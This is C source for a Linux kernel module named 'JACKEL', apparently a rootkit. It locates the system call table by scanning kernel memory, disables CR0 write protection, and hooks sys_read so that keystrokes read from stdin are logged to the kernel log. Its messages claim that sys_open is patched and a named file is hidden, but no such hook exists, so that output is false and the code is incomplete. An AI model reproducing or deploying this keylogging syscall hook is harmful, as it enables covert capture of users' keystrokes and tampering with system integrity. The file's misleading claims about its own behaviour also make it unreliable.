#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>

MODULE_LICENSE( "GPL" );

static char *file = "blah";

module_param( file, charp, 0 );
MODULE_PARM_DESC( file, "file to hide" );

unsigned long **sys_call_table;
unsigned long original_cr0;

asmlinkage long ( *ref_sys_read )( unsigned int fd, char __user *buf, size_t count );

/* intercept key strokes */
asmlinkage long new_sys_read( unsigned int fd, char __user *buf, size_t count ) {
    long ret;
    ret = ref_sys_read( fd, buf, count );

    if( count == 1 && fd == 0 )
        printk( KERN_INFO " |- Intercepted key-stroke: %X", buf[0] );

    return ret;
}

static unsigned long **aquire_sys_call_table( void ) {
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    while ( offset < ULLONG_MAX ) {
        sct = ( unsigned long ** )offset;

        if ( sct[__NR_close] == ( unsigned long * ) sys_close ) 
            return sct;

        offset += sizeof( void * );
    }

    return NULL;
}

static int __init jackle_start( void ) {
    
    printk( KERN_INFO "[+]  J A C K E L\n" );
    if( !( sys_call_table = aquire_sys_call_table() ) )
        return -1;
    original_cr0 = read_cr0();
    printk( KERN_INFO " |- Aquired sys_call_table\n" );

    write_cr0( original_cr0 & ~0x00010000 );
    printk( KERN_INFO " |- Unlocked table!!\n" );

    ref_sys_read = ( void * )sys_call_table[__NR_read];
    sys_call_table[__NR_read] = ( unsigned long * )new_sys_read;
    printk( KERN_INFO " |- Patched sys_read\n" );

    printk( KERN_INFO " |- Patched sys_open\n" );
    printk( KERN_INFO " |  ` hiding %s\n", file );
    write_cr0( original_cr0 );

    /* printk( KERN_INFO "[+] Hiding %s from userland\n", file_to_hide ); */

    return 0;
}

static void __exit jackle_end( void ) {
    if( !sys_call_table ) {
        return;
    }

    write_cr0( original_cr0 & ~0x00010000 );
    sys_call_table[__NR_read] = ( unsigned long * )ref_sys_read;
    write_cr0( original_cr0 );
}

module_init( jackle_start );
module_exit( jackle_end );
